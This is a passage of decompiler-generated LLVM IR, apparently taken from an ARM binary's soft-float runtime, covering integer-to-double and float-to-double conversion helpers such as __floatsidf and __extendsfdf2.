  %v0_1c03c = load i32, i32* @r4, align 4
  %v1_1c03c = add i32 %v0_1c03c, 1
  store i32 %v1_1c03c, i32* @r4, align 4
  %v3_1c040 = mul i32 %v1_1c03c, 2097152
  %v2_1c044 = icmp ugt i32 %v3_1c040, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1c044, i32 ptrtoint (i32* @global_var_1c1d8.1689 to i32))
  br label %dec_label_pc_1c04c

dec_label_pc_1c04c:                               ; preds = %dec_label_pc_1c064, %dec_label_pc_1c028, %dec_label_pc_1c030
  %v0_1c04c = load i32, i32* @ip, align 4
  %v2_1c04c = icmp slt i32 %v0_1c04c, 0
  %v6_1c04c = icmp eq i32 %v0_1c04c, -2147483648
  %v1_1c050 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1c04c, label %bb, label %dec_label_pc_1c04c._crit_edge

bb:                                               ; preds = %dec_label_pc_1c04c
  %v2_1c050 = urem i32 %v1_1c050, 2
  %v3_1c050 = icmp ne i32 %v2_1c050, 0
  br label %dec_label_pc_1c04c._crit_edge

dec_label_pc_1c04c._crit_edge:                    ; preds = %dec_label_pc_1c04c, %bb
  %v1_1c054 = phi i1 [ %v3_1c050, %bb ], [ %v2_1c04c, %dec_label_pc_1c04c ]
  %v2_1c054 = zext i1 %v1_1c054 to i32
  %v3_1c054 = add i32 %v2_1c054, %v1_1c050
  store i32 %v3_1c054, i32* %r1.global-to-local, align 4
  %v0_1c058 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c058 = load i32, i32* @r4, align 4
  %v2_1c058 = and i32 %v1_1c058, 4096
  %v3_1c058 = icmp ne i32 %v2_1c058, 0
  %v4_1c058 = mul i32 %v1_1c058, 1048576
  %v6_1c058 = add i32 %v4_1c058, %v0_1c058
  %v7_1c058 = zext i1 %v3_1c058 to i32
  %v8_1c058 = add i32 %v7_1c058, %v6_1c058
  %v1_1c05c = load i32, i32* @r5, align 4
  %v2_1c05c = or i32 %v1_1c05c, %v8_1c058
  store i32 %v2_1c05c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1c05c

dec_label_pc_1c064:                               ; preds = %dec_label_pc_1c020
  %v0_1c064 = load i32, i32* @ip, align 4
  %v1_1c064 = icmp slt i32 %v0_1c064, 0
  %v2_1c064 = mul i32 %v0_1c064, 2
  store i32 %v2_1c064, i32* @ip, align 4
  %v0_1c068 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c068 = mul i32 %v0_1c068, 2
  %v4_1c068 = zext i1 %v1_1c064 to i32
  %v5_1c068 = or i32 %v3_1c068, %v4_1c068
  store i32 %v5_1c068, i32* %r1.global-to-local, align 4
  %v9_1c068 = icmp ule i32 %v5_1c068, %v0_1c068
  %v10_1c068 = icmp ult i32 %v3_1c068, %v0_1c068
  %v11_1c068 = select i1 %v1_1c064, i1 %v9_1c068, i1 %v10_1c068
  %v3_1c06c = mul i32 %arg1, 2
  %v4_1c06c = zext i1 %v11_1c068 to i32
  %v5_1c06c = or i32 %v4_1c06c, %v3_1c06c
  store i32 %v5_1c06c, i32* %r0.global-to-local, align 4
  %v1_1c070 = and i32 %v3_1c06c, 1048576
  %v2_1c070 = icmp eq i32 %v1_1c070, 0
  %v0_1c074 = load i32, i32* @r4, align 4
  %v1_1c074 = add i32 %v0_1c074, -1
  store i32 %v1_1c074, i32* @r4, align 4
  br i1 %v2_1c070, label %bb7, label %dec_label_pc_1c04c

bb7:                                              ; preds = %dec_label_pc_1c064
  ret i32 %v5_1c06c

; uselistorder directives
  uselistorder i32 %v0_1c068, { 1, 2, 0 }
  uselistorder i1 %v1_1c064, { 1, 0 }
  uselistorder i32 %v1_1c050, { 1, 0 }
  uselistorder i32 %v0_1c04c, { 1, 0 }
  uselistorder i32 %v0_1c038, { 1, 0, 2 }
  uselistorder i32 %v0_1c034, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1c04c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1c04c, { 0, 2, 1 }
}

define i32 @function_1c07c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c07c:
  %v2_1c07c = icmp eq i32 %arg1, 0
  br i1 %v2_1c07c, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_1c07c
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_1c07c
  %v1_1c08810 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_1c0e4 = phi i32 [ %arg1, %bb ], [ %v1_1c08810, %bb35 ]
  %v1_1c09c = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_1c094 = icmp ugt i32 %v0_1c0e4, 65535
  br i1 %v2_1c094, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_1c098 = and i32 %v0_1c0e4, 32768
  %v3_1c098 = icmp eq i32 %v2_1c098, 0
  %v4_1c098 = udiv i32 %v0_1c0e4, 65536
  br i1 %v3_1c098, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_1c09c = add nsw i32 %v1_1c09c, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_1c0a8 = phi i32 [ %v1_1c09c, %.thread ], [ %v1_1c09c, %bb36 ], [ %v2_1c09c, %bb37 ]
  %v1_1c0a4 = phi i32 [ %v0_1c0e4, %.thread ], [ %v4_1c098, %bb36 ], [ %v4_1c098, %bb37 ]
  %v2_1c0a0 = icmp ugt i32 %v1_1c0a4, 255
  br i1 %v2_1c0a0, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_1c0a4 = and i32 %v1_1c0a4, 128
  %v3_1c0a4 = icmp eq i32 %v2_1c0a4, 0
  %v4_1c0a4 = udiv i32 %v1_1c0a4, 256
  br i1 %v3_1c0a4, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_1c0a8 = add nsw i32 %v1_1c0a8, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_1c0b4 = phi i32 [ %v1_1c0a8, %.thread3 ], [ %v1_1c0a8, %bb38 ], [ %v2_1c0a8, %bb39 ]
  %v1_1c0b0 = phi i32 [ %v1_1c0a4, %.thread3 ], [ %v4_1c0a4, %bb38 ], [ %v4_1c0a4, %bb39 ]
  %v2_1c0ac = icmp ugt i32 %v1_1c0b0, 15
  br i1 %v2_1c0ac, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_1c0b0 = and i32 %v1_1c0b0, 8
  %v3_1c0b0 = icmp eq i32 %v2_1c0b0, 0
  %v4_1c0b0 = udiv i32 %v1_1c0b0, 16
  br i1 %v3_1c0b0, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_1c0b4 = add nsw i32 %v1_1c0b4, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_1c0bc = phi i32 [ %v1_1c0b4, %.thread4 ], [ %v1_1c0b4, %bb40 ], [ %v2_1c0b4, %bb41 ]
  %v1_1c0c4 = phi i32 [ %v1_1c0b0, %.thread4 ], [ %v4_1c0b0, %bb40 ], [ %v4_1c0b0, %bb41 ]
  %v2_1c0b8 = icmp ugt i32 %v1_1c0c4, 3
  br i1 %v2_1c0b8, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_1c0bc = add i32 %v1_1c0bc, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_1c0c0 = udiv i32 %v1_1c0c4, 2
  %v6_1c0c0 = sub i32 %v1_1c0bc, %v5_1c0c0
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_1c0c4 = phi i32 [ %v6_1c0c0, %.thread6 ], [ %v2_1c0bc, %bb42 ]
  %v4_1c0c4 = udiv i32 %v1_1c0c4, 8
  %v5_1c0c4 = sub i32 %v0_1c0c4, %v4_1c0c4
  %v2_1c0c8 = add i32 %v5_1c0c4, -32
  %v4_1c0c8 = sub i32 31, %v5_1c0c4
  %v5_1c0c8 = and i32 %v4_1c0c8, %v5_1c0c4
  %v8_1c0c8 = icmp eq i32 %v5_1c0c4, 32
  %v6_1c0cc = icmp slt i32 %v5_1c0c4, 32
  br i1 %v6_1c0cc, label %dec_label_pc_1c0d0, label %dec_label_pc_1c0f0

dec_label_pc_1c0d0:                               ; preds = %bb43
  %v2_1c0d0 = add i32 %v5_1c0c4, -20
  %v7_1c0d4 = icmp sgt i32 %v2_1c0c8, -12
  br i1 %v7_1c0d4, label %dec_label_pc_1c0d8, label %dec_label_pc_1c0ec

dec_label_pc_1c0d8:                               ; preds = %dec_label_pc_1c0d0
  %v1_1c0dc = sub i32 32, %v5_1c0c4
  %v6_1c0e0 = shl i32 %v0_1c0e4, %v5_1c0c4
  store i32 %v6_1c0e0, i32* @r1, align 4
  %v6_1c0e4 = lshr i32 %v0_1c0e4, %v1_1c0dc
  br label %.thread31

dec_label_pc_1c0ec:                               ; preds = %dec_label_pc_1c0d0
  %v8_1c0d0 = icmp eq i32 %v2_1c0d0, 0
  %v4_1c0d0 = add i32 %v5_1c0c4, 2147483616
  %v5_1c0d0 = and i32 %v2_1c0d0, %v4_1c0d0
  br label %dec_label_pc_1c0f0

dec_label_pc_1c0f0:                               ; preds = %bb43, %dec_label_pc_1c0ec
  %v1_1c0fc.in = phi i32 [ %v2_1c0c8, %bb43 ], [ %v2_1c0d0, %dec_label_pc_1c0ec ]
  %v6_1c0fc = phi i32 [ %v2_1c0c8, %bb43 ], [ %v5_1c0c4, %dec_label_pc_1c0ec ]
  %v2_1c0fc.in = phi i32 [ %v5_1c0c8, %bb43 ], [ %v5_1c0d0, %dec_label_pc_1c0ec ]
  %v0_1c0fc = phi i1 [ %v8_1c0c8, %bb43 ], [ %v8_1c0d0, %dec_label_pc_1c0ec ]
  %v1_1c0fc = icmp slt i32 %v1_1c0fc.in, 0
  %v2_1c0fc = icmp slt i32 %v2_1c0fc.in, 0
  %v3_1c0f0 = xor i1 %v2_1c0fc, %v1_1c0fc
  %v4_1c0f0 = or i1 %v0_1c0fc, %v3_1c0f0
  br i1 %v4_1c0f0, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_1c0f0
  %v6_1c0f0 = sub i32 32, %v6_1c0fc
  store i32 %v6_1c0f0, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1c0f0, %bb44
  %v6_1c0f4 = shl i32 %v0_1c0e4, %v6_1c0fc
  br i1 %v4_1c0f0, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_1c0f8 = load i32, i32* @r1, align 4
  %v7_1c0f8 = load i32, i32* @ip, align 4
  %v12_1c0f8 = lshr i32 %v6_1c0f8, %v7_1c0f8
  %v13_1c0f8 = or i32 %v12_1c0f8, %v6_1c0f4
  %v11_1c0fc = shl i32 %v6_1c0f8, %v6_1c0fc
  store i32 %v11_1c0fc, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_1c0d8, %bb46
  %v1_1c148 = phi i32 [ %v6_1c0e4, %dec_label_pc_1c0d8 ], [ %v13_1c0f8, %bb46 ], [ %v6_1c0f4, %bb45 ]
  %v0_1c100 = load i32, i32* @r4, align 4
  %v2_1c100 = sub i32 %v0_1c100, %v5_1c0c4
  %v5_1c104 = icmp slt i32 %v0_1c100, %v5_1c0c4
  br i1 %v5_1c104, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_1c104 = mul i32 %v2_1c100, 1048576
  %v11_1c104 = add i32 %v10_1c104, %v1_1c148
  %v7_1c108 = load i32, i32* @r5, align 4
  %v8_1c108 = or i32 %v7_1c108, %v11_1c104
  ret i32 %v8_1c108

bb48:                                             ; preds = %.thread31
  %v2_1c114 = sub i32 -32, %v2_1c100
  %v6_1c118 = icmp sgt i32 %v2_1c100, -32
  br i1 %v6_1c118, label %dec_label_pc_1c11c, label %dec_label_pc_1c154

dec_label_pc_1c11c:                               ; preds = %bb48
  %v1_1c11c = add i32 %v2_1c114, 12
  %v8_1c120 = icmp sgt i32 %v1_1c11c, 0
  br i1 %v8_1c120, label %dec_label_pc_1c13c, label %dec_label_pc_1c124

dec_label_pc_1c124:                               ; preds = %dec_label_pc_1c11c
  %v1_1c124 = add i32 %v2_1c114, 32
  %v0_1c134 = load i32, i32* @r5, align 4
  %v7_1c134 = lshr i32 %v1_1c148, %v1_1c124
  %v8_1c134 = or i32 %v0_1c134, %v7_1c134
  ret i32 %v8_1c134

dec_label_pc_1c13c:                               ; preds = %dec_label_pc_1c11c
  %v0_1c14c = load i32, i32* @r5, align 4
  ret i32 %v0_1c14c

dec_label_pc_1c154:                               ; preds = %bb48
  %v0_1c158 = load i32, i32* @r5, align 4
  ret i32 %v0_1c158

; uselistorder directives
  uselistorder i32 %v2_1c100, { 1, 0, 2 }
  uselistorder i32 %v1_1c148, { 1, 0 }
  uselistorder i32 %v6_1c0f4, { 1, 0 }
  uselistorder i32 %v2_1c0c8, { 1, 0, 2 }
  uselistorder i32 %v5_1c0c4, { 5, 4, 6, 2, 7, 1, 3, 8, 9, 0, 11, 10 }
  uselistorder i32 %v4_1c0b0, { 1, 0 }
  uselistorder i32 %v1_1c0b0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c0a4, { 1, 0 }
  uselistorder i32 %v1_1c0a4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c098, { 1, 0 }
  uselistorder i32 %v0_1c0e4, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 -12, { 1, 2, 14, 15, 3, 17, 18, 4, 19, 20, 16, 13, 12, 11, 10, 9, 21, 22, 23, 5, 6, 7, 24, 8, 25, 26, 28, 29, 30, 27, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 13, 7, 2, 4, 5, 3, 14, 6, 12, 8, 15, 17, 16, 18, 0, 9, 1, 10, 19, 11 }
  uselistorder i32 15, { 2, 3, 1, 6, 4, 9, 0, 5, 7, 8 }
  uselistorder i32 -8, { 7, 14, 15, 16, 17, 18, 19, 13, 12, 5, 11, 10, 9, 8, 20, 21, 22, 23, 6, 24, 25, 3, 0, 29, 26, 27, 28, 2, 30, 31, 4, 1 }
  uselistorder i32 128, { 12, 13, 18, 0, 6, 7, 10, 5, 24, 25, 1, 23, 8, 19, 20, 2, 3, 11, 21, 22, 4, 15, 9, 14, 16, 17 }
  uselistorder i32 255, { 9, 10, 13, 1, 12, 0, 11, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0, 23 }
  uselistorder i32 65535, { 2, 3, 1, 4, 0 }
  uselistorder i32 52, { 0, 4, 5, 6, 7, 8, 2, 3, 1 }
  uselistorder i32 20, { 3, 25, 26, 7, 27, 28, 29, 30, 0, 31, 38, 5, 39, 1, 6, 32, 33, 13, 23, 14, 8, 2, 9, 34, 35, 36, 37, 15, 16, 17, 18, 19, 20, 21, 22, 4, 10, 11, 12, 24 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1c0f0, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1c160(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1c160:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1c160 = load i32, i32* @r4, align 4
  %v2_1c160 = icmp eq i32 %v0_1c160, 0
  %v1_1c164 = xor i32 %arg3, 1048576
  store i32 %v1_1c164, i32* @r2, align 4
  br i1 %v2_1c160, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1c160
  %v2_1c168 = xor i32 %arg1, 1048576
  store i32 %v2_1c168, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1c160
  %v1_1c170 = load i32, i32* @r5, align 4
  %v2_1c170 = add i32 %v1_1c170, -1
  store i32 %v2_1c170, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1c174 = call i32 @function_1bfcc()
  %v0_1c178 = load i32, i32* @r4, align 4
  %v0_1c178.off = add i32 %v0_1c178, 4194303
  %tmp = icmp ult i32 %v0_1c178.off, 2097152
  %v1_1c1f4 = load i32, i32* @r5, align 4
  %v1_1c1f4.off = add i32 %v1_1c1f4, 4194303
  %tmp45 = icmp ult i32 %v1_1c1f4.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_1c184

dec_label_pc_1c184:                               ; preds = %bb33
  %v4_1c184 = icmp eq i32 %v1_1c1f4, %v0_1c178
  %v1_1c188 = load i32, i32* @r1, align 4
  br i1 %v4_1c184, label %bb34, label %dec_label_pc_1c190

bb34:                                             ; preds = %dec_label_pc_1c184
  %v2_1c188 = load i32, i32* @r3, align 4
  %v5_1c188 = icmp eq i32 %v2_1c188, %v1_1c188
  br i1 %v5_1c188, label %dec_label_pc_1c1a0, label %dec_label_pc_1c190

dec_label_pc_1c190:                               ; preds = %dec_label_pc_1c184, %bb34
  %v2_1c190 = or i32 %v1_1c188, %v0_1c178
  %v4_1c190 = icmp eq i32 %v2_1c190, 0
  br i1 %v4_1c190, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_1c190
  %v1_1c194 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1c190, %bb35
  %v11_1c19c = phi i32 [ %v0_1c174, %dec_label_pc_1c190 ], [ %v1_1c194, %bb35 ]
  ret i32 %v11_1c19c

dec_label_pc_1c1a0:                               ; preds = %bb34
  %v1_1c1a0 = load i32, i32* @r2, align 4
  %v4_1c1a0 = icmp eq i32 %v1_1c1a0, %v0_1c174
  br i1 %v4_1c1a0, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_1c1a0
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_1c1a0
  %tmp46 = icmp ult i32 %v0_1c178, 2097152
  br i1 %tmp46, label %dec_label_pc_1c1b8, label %dec_label_pc_1c1c8

dec_label_pc_1c1b8:                               ; preds = %.thread8
  %v1_1c1b8 = icmp slt i32 %v1_1c188, 0
  %v3_1c1bc = mul i32 %v0_1c174, 2
  %v4_1c1bc = zext i1 %v1_1c1b8 to i32
  %v5_1c1bc = or i32 %v4_1c1bc, %v3_1c1bc
  %v9_1c1bc = icmp ule i32 %v5_1c1bc, %v0_1c174
  %v10_1c1bc = icmp ult i32 %v3_1c1bc, %v0_1c174
  %v11_1c1bc = select i1 %v1_1c1b8, i1 %v9_1c1bc, i1 %v10_1c1bc
  br i1 %v11_1c1bc, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_1c1b8
  %v2_1c1c0 = or i32 %v5_1c1bc, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_1c1b8, %bb37
  %v11_1c1c4 = phi i32 [ %v5_1c1bc, %dec_label_pc_1c1b8 ], [ %v2_1c1c0, %bb37 ]
  ret i32 %v11_1c1c4

dec_label_pc_1c1c8:                               ; preds = %.thread8
  %v2_1c1c8 = icmp ugt i32 %v0_1c178, -4194305
  br i1 %v2_1c1c8, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_1c1c8
  %v2_1c1cc = add i32 %v0_1c174, 1048576
  ret i32 %v2_1c1cc

.thread9:                                         ; preds = %dec_label_pc_1c1c8
  %v1_1c1d4 = and i32 %v0_1c174, -2147483648
  %v1_1c1dc = or i32 %v1_1c1d4, 2146435072
  ret i32 %v1_1c1dc

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_1c200.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_1c174, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_1c1ec = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_1c20027 = phi i32 [ %v0_1c174, %.thread14 ], [ %v1_1c1ec, %bb40 ]
  %v1_1c1fc.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_1c1fc = load i32, i32* %v1_1c1fc.in, align 4
  store i32 %v1_1c1fc, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_1c20c = phi i32 [ %v0_1c174, %.thread11..thread13_crit_edge ], [ %v1_1c20027, %bb41 ]
  %v0_1c200 = phi i32 [ %v0_1c200.pre, %.thread11..thread13_crit_edge ], [ %v1_1c1fc, %bb41 ]
  %v4_1c200 = mul i32 %v1_1c20c, 4096
  %v5_1c200 = or i32 %v4_1c200, %v0_1c200
  %v7_1c200 = icmp eq i32 %v5_1c200, 0
  br i1 %v7_1c200, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_1c204 = load i32, i32* @r3, align 4
  %v2_1c204 = load i32, i32* @r2, align 4
  %v5_1c204 = mul i32 %v2_1c204, 4096
  %v6_1c204 = or i32 %v5_1c204, %v1_1c204
  %v8_1c204 = icmp eq i32 %v6_1c204, 0
  br i1 %v8_1c204, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_1c208 = icmp eq i32 %v2_1c204, %v1_1c20c
  br i1 %v5_1c208, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_1c20c = or i32 %v1_1c20c, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_1c210 = phi i32 [ %v1_1c20c, %bb43 ], [ %v2_1c20c, %.thread17 ]
  ret i32 %v11_1c210

; uselistorder directives
  uselistorder i32 %v1_1c20c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1c1fc, { 1, 0 }
  uselistorder i1 %v1_1c1b8, { 1, 0 }
  uselistorder i32 %v1_1c188, { 2, 1, 0 }
  uselistorder i32 %v0_1c178, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_1c174, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1c190, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1c214 = icmp eq i32 %arg1, 0
  br i1 %v2_1c214, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_1c238 = call i32 @function_1c07c(i32 0)
  ret i32 %v1_1c238

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1c23c = icmp eq i32 %arg1, 0
  br i1 %v2_1c23c, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  %v1_1c254 = and i32 %arg1, -2147483648
  store i32 %v1_1c254, i32* @r5, align 4
  %v2_1c254 = icmp eq i32 %v1_1c254, 0
  br i1 %v2_1c254, label %bb5, label %bb4

bb4:                                              ; preds = %.thread
  %v2_1c258 = sub i32 0, %arg1
  br label %bb5

bb5:                                              ; preds = %.thread, %bb4
  %v0_1c25c = phi i32 [ %arg1, %.thread ], [ %v2_1c258, %bb4 ]
  store i32 %v0_1c25c, i32* @r1, align 4
  %v1_1c264 = call i32 @function_1c07c(i32 0)
  ret i32 %v1_1c264

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1c268 = mul i32 %arg1, 2
  %v4_1c268 = icmp eq i32 %v2_1c268, 0
  %v1_1c26c = and i32 %v2_1c268, 4
  %v2_1c26c = icmp ne i32 %v1_1c26c, 0
  %v3_1c26c = sdiv i32 %v2_1c268, 8
  %v3_1c270 = zext i1 %v2_1c26c to i32
  %v6_1c270 = zext i32 %v3_1c26c to i64
  %v7_1c270 = sub nsw i32 33, %v3_1c26c
  %v8_1c270 = zext i32 %v7_1c270 to i64
  %v9_1c270 = shl i64 %v6_1c270, %v8_1c270
  %v10_1c270 = sub nsw i32 32, %v3_1c26c
  %v11_1c270 = shl i32 %v3_1c270, %v10_1c270
  %v12_1c270 = zext i32 %v11_1c270 to i64
  %v14_1c270 = or i64 %v12_1c270, %v9_1c270
  %v15_1c270 = trunc i64 %v14_1c270 to i32
  %v3_1c274 = mul i32 %arg1, 536870912
  store i32 %v3_1c274, i32* @r1, align 4
  br i1 %v4_1c268, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_1c278 = icmp ult i32 %v2_1c268, 16777216
  br i1 %v4_1c278, label %bb12, label %bb9

bb9:                                              ; preds = %bb
  %v4_1c28c18 = icmp ugt i32 %v2_1c268, -16777217
  br i1 %v4_1c28c18, label %bb11.thread, label %bb10

bb11.thread:                                      ; preds = %bb9
  br label %.thread3

bb10:                                             ; preds = %bb9
  %v2_1c2806 = xor i32 %v15_1c270, 939524096
  ret i32 %v2_1c2806

.thread2:                                         ; preds = %entry
  br label %.thread3

.thread3:                                         ; preds = %bb11.thread, %.thread2
  ret i32 %v15_1c270

bb12:                                             ; preds = %bb
  store i32 896, i32* @r4, align 4
  %v1_1c29c = and i32 %v15_1c270, -2147483648
  store i32 %v1_1c29c, i32* @r5, align 4
  %tmp = bitcast i32 %v15_1c270 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1c2a0 = bitcast float %tmp19 to i32
  %v1_1c2a4 = call i32 @function_1c07c(i32 %v1_1c2a0)
  ret i32 %v1_1c2a4

; uselistorder directives
  uselistorder i32 %v15_1c270, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1c26c, { 1, 2, 0 }
  uselistorder i32 %v2_1c268, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @function_1c07c, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1c2a8 = or i32 %arg2, %arg1
  %v4_1c2a8 = icmp eq i32 %v2_1c2a8, 0
  br i1 %v4_1c2a8, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v0_1c2b8 = call i32 @function_1c2d8()
  ret i32 %v0_1c2b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1c2bc = or i32 %arg2, %arg1
  %v4_1c2bc = icmp eq i32 %v2_1c2bc, 0
  br i1 %v4_1c2bc, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  %v1_1c2cc = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1c2cc, i32 ptrtoint (i32* @global_var_1c2d8.1690 to i32))
  %v1_1c2d0 = sub i32 0, %arg1
  ret i32 %v1_1c2d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_1c2d8() local_unnamed_addr {
dec_label_pc_1c2d8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1c2e0 = load i32, i32* @r0, align 4
  %v0_1c2e4 = load i32, i32* @r1, align 4
  store i32 %v0_1c2e4, i32* %r0.global-to-local, align 4
  store i32 %v0_1c2e0, i32* %r1.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1c2e4, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1c020.1688 to i32))
  %tmp6 = icmp ult i32 %v0_1c2e4, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1c2d8
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1c2d8, %bb
  %v1_1c304 = phi i32 [ 3, %dec_label_pc_1c2d8 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1c2e4, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1c304 = add nuw nsw i32 %v1_1c304, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
